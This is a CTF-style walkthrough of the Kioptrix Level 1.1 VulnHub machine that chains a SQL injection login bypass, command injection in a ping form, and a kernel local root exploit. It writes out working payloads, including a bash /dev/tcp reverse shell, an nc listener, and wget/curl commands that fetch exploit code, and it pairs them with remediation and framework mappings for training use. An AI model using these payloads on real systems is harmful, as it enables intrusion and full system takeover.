# Kioptrix: Level 1.1 — SQL, Commands, and a Kernel That Can't Be Trusted

Dude, Kioptrix Level 1.1 (Level 2) steps it up from the pure buffer overflow of Level 1. This one layers three vulnerabilities on top of each other: SQL injection to bypass authentication, command injection in a ping utility, and a kernel privilege escalation. Each one is foundational, and the chain is clean. No cap, this is exactly how real web application attacks combined with post-exploitation work. fr fr.

The ping form command injection is genuinely one of the most satisfying moments in CTF history: you authenticate with `' or '1'='1'`, get handed a web-based ping utility, and immediately realize "I can inject commands here." Classic. gg

---

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Kioptrix: Level 1.1 (#2) |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/kioptrix-level-11-2,23/ |
| **Techniques** | Nmap service enumeration, SQL injection authentication bypass, command injection via ping form, reverse shell, kernel local privilege escalation (EDB-9542) |
| **CVEs** | CWE-89 (SQL Injection: authentication bypass via unsanitized login form); CWE-78 (OS Command Injection: user input passed directly to shell via ping form); CVE-2009-2698 (Linux kernel 2.6.x sock_sendpage NULL pointer dereference, EDB-9542 local root) |
| **APT Groups** | SQL injection authentication bypass is used by APT41 in web application initial access; command injection patterns appear in OceanLotus (APT32) post-exploitation tooling for Linux targets |

---

## Attack Summary

```
netdiscover → target: 192.168.1.111
    |
    v
nmap → HTTP (80), HTTPS (443), SSH (22), MySQL (3306)
    |
    v
browse http://192.168.1.111 → admin login form
    |
    v
SQL injection: username = 1' or '1' password = 1' or '1'
    |
    v
authenticated → ping utility page
    |
    v
command injection: 127.0.0.1; bash -i >& /dev/tcp/LHOST/8888 0>&1
    |
    v
reverse shell as apache user
    |
    v
uname -a → kernel 2.6.9-55.EL
    |
    v
EDB-9542 → compile + execute → uid=0(root)
    |
    v
root flag
```

---

## Methodology

1. Network discovery and full port scan
2. Web application analysis: identify login form
3. SQL injection bypass to gain authenticated access
4. Identify command injection vulnerability in ping utility
5. Deliver reverse shell via command injection
6. Stabilize shell
7. Enumerate kernel version
8. Compile and execute local kernel exploit
9. Root access confirmed

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24

nmap -sV -sC -p- 192.168.1.111
```

Key findings:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 3.9p1
80/tcp   open  http    Apache httpd 2.0.52
443/tcp  open  ssl
3306/tcp open  mysql   MySQL 4.1.22
```

HTTP on port 80 is the primary target. MySQL exposed on 3306 is a secondary note. The Apache 2.0.x is old enough to have its own CVEs, but the web application is the attack surface.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Application Analysis

Navigate to `http://192.168.1.111/`. An admin login form is presented immediately.

Before trying credentials, test for SQL injection. The login form likely uses a query like:

```sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
```

If the application concatenates user input directly into SQL without parameterization, injection works.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

---

## Step 3 — SQL Injection Authentication Bypass

Test the classic authentication bypass payload:

```
Username: 1' or '1'='1
Password: 1' or '1'='1
```

This transforms the SQL query into:

```sql
SELECT * FROM users WHERE username='1' OR '1'='1' AND password='1' OR '1'='1'
```

The `OR '1'='1'` condition always evaluates to true, bypassing the credential check entirely. The server authenticates and presents a post-login page: a ping utility form.

**Real-world note:** SQL injection in authentication forms was the defining web vulnerability of the 2000s and remains in OWASP Top 10 under A03:2021 (Injection). The fix has been known since 1998: parameterized queries / prepared statements. Yet SQL injection authentication bypasses still appear in real penetration tests, particularly in legacy applications and bespoke CMS platforms.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1078 — Valid Accounts (bypassed)

---

## Step 4 — Command Injection via Ping Form

The post-login page presents a form labeled "Ping a Machine on the Network." The application takes user input and passes it to a shell command like:

```php
system("ping -c 3 " . $_POST['ip']);
```

Test for command injection:

```
127.0.0.1; id
```

If the output includes `uid=48(apache)`, command injection is confirmed. The semicolon terminates the ping command and starts a new command.

**Why this works:** the developer treats the ping form as a "safe utility" but passes user input directly to the OS without escaping or whitelisting. This is CWE-78 in its purest form.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell; T1190 — Exploit Public-Facing Application

---

## Step 5 — Reverse Shell Delivery

Start a listener:

```bash
nc -lvnp 8888
```

Submit the reverse shell payload via the ping form:

```
127.0.0.1; bash -i >& /dev/tcp/192.168.1.2/8888 0>&1
```

Shell arrives as `apache` user (uid=48). Stabilize:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Note:** This kernel is old enough that it may have Python 2 but not Python 3. Use `python` not `python3` if the pty command fails.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — Kernel Privilege Escalation (EDB-9542)

Check the kernel version:

```bash
uname -a
# Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686
```

Kernel 2.6.9-55.EL is vulnerable to a local privilege escalation exploit (Exploit-DB 9542, also related to CVE-2009-2698). This is a NULL pointer dereference in the `sock_sendpage` function.

Transfer the exploit to the target:

```bash
# On attacker: start a simple HTTP server
python3 -m http.server 80

# On victim shell:
cd /tmp
wget http://192.168.1.2/9542.c -O shell.c
# or:
curl http://192.168.1.2/9542.c -o shell.c
```

Compile and execute:

```bash
gcc shell.c -o shell
./shell
```

Expected output:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
whoami
# root
```

**Real-world note:** Local kernel exploits for Linux 2.6.x were prolific between 2008 and 2012. CVE-2009-2698, CVE-2010-3081 (RDS), and CVE-2009-1185 (udev) are all classic examples. They required gcc on the target (common in older Linux installations) and a brief compile. Modern Linux kernels (5.x+) have far stronger exploit mitigations (SMEP, SMAP, KASLR, seccomp), making kernel privesc significantly harder.

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Notes |
|---|---|---|---|
| Authentication bypass | SQLi payload | Login form | Bypasses credential check entirely |
| Initial shell | apache (uid=48) | Ping form command injection | No credentials needed |
| Root shell | uid=0(root) | EDB-9542 kernel exploit | /tmp/shell compiled on target |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SQL injection authentication bypass | Still in OWASP Top 10; legacy apps with string concatenation in SQL queries are trivially bypassed | Use parameterized queries in all database interactions; no string concatenation in SQL |
| 2 | Command injection in ping form | Any user input passed to OS commands without escaping creates RCE | Whitelist valid input (IPs only); use `escapeshellarg()`; never pass raw input to system() |
| 3 | MySQL exposed on 3306 | Database ports exposed to the network increase attack surface dramatically | Bind MySQL to localhost only: `bind-address = 127.0.0.1` in my.cnf |
| 4 | Linux kernel 2.6.9 without patches | Dozens of public LPE exploits exist for kernel 2.6.x; gcc on target makes compilation trivial | Keep kernel patched; implement kernel hardening (SMEP/SMAP/seccomp); restrict gcc in production |
| 5 | Multiple chained vulnerabilities | SQLi + command injection + kernel LPE is a realistic real-world chain against legacy web apps | Defense in depth: fixing any single link breaks the chain |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application (SQLi bypass) | T1190 |
| Initial Access | Initial Access | Valid Accounts (bypassed via SQLi) | T1078 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell (command injection) | T1059.004 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation (kernel LPE) | T1068 |
| Defense Evasion | Defense Evasion | Exploitation for Defense Evasion | T1211 |

---

## Remediation and Containment

### Technical Fixes

1. **Fix SQL injection**: Replace string concatenation with parameterized queries in all database interactions
2. **Fix command injection**: Replace the ping utility with a safe API; validate input (IP format only); use `escapeshellarg()`
3. **Upgrade kernel**: Replace kernel 2.6.9 with a currently supported kernel version
4. **Bind MySQL to localhost**: Add `bind-address = 127.0.0.1` in `/etc/my.cnf`
5. **Upgrade Apache 2.0.52**: Replace with Apache 2.4.x with security hardening headers

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all web applications; audit all SQL queries for injection |
| Protect | Protective Technology | Parameterized queries in all SQL; input validation on all user-controlled fields |
| Protect | Access Control | Bind MySQL to localhost; firewall database ports |
| Detect | Anomalies and Events | WAF rule for SQLi patterns; command injection detection |
| Respond | Response Planning | Patch kernel; rotate all credentials; audit all accounts |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-10 | Information Input Validation | Whitelist all user input passed to OS commands; parameterized SQL |
| CM-7 | Least Functionality | MySQL bound to localhost; disable unused network services |
| SI-2 | Flaw Remediation | Kernel patching within defined SLA |
| SC-5 | Denial-of-Service Protection | Rate-limit form submissions |

### CISA KEV

SQL injection (CWE-89) appears in dozens of CISA KEV entries. CISA Binding Operational Directive 22-01 requires remediation of catalogued SQL injection vulnerabilities. CISA Alert AA21-321A highlights command injection as a top routinely exploited vulnerability class.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |
| Identity and Access Management (IAM) | Manage Authentication | MIL3 |

### MITRE D3FEND Countermeasures

- **D3-SQLP** — SQL Injection Prevention (parameterized queries, prepared statements)
- **D3-OSCI** — OS Command Injection Prevention (input validation, no direct shell execution)
- **D3-SU** — Software Update (kernel upgrade; Apache upgrade)

---

## Final Thoughts

Kioptrix Level 1.1 is a perfect progression from Level 1. Instead of one raw exploit, it chains three vulnerabilities: SQLi, command injection, and kernel LPE. Each one is a real, teachable technique. The fact that they chain cleanly is the pedagogical brilliance of this machine.

The real-world relevance is high: legacy web applications with string-concatenated SQL and unvalidated form inputs are still found in production. The kernel LPE is the historical part, but the web application vulnerabilities are completely modern threats.

If you get to root on this one, you've earned it in three different ways. gg fr fr.

Thanks guys!! (❍ᴥ❍ʋ)
